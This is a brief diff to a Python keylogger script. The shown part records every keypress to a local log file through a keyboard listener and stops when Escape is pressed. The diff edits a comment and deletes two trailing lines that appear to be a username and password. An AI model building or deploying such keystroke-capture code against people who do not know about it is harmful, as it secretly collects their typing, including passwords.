@@ -14,7 +14,7 @@ def on_press(key):
         with open(log_file, "a") as f:
             f.write(f" {key} ")
 
-# Function to stop the keylogger (optional)
+# Function to stop the keylogger
 def on_release(key):
     # This will stop the listener if the escape key is pressed
     if key == Key.esc:
@@ -24,6 +24,5 @@ def on_release(key):
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
-sharmeen
-sharu@2345
+
 
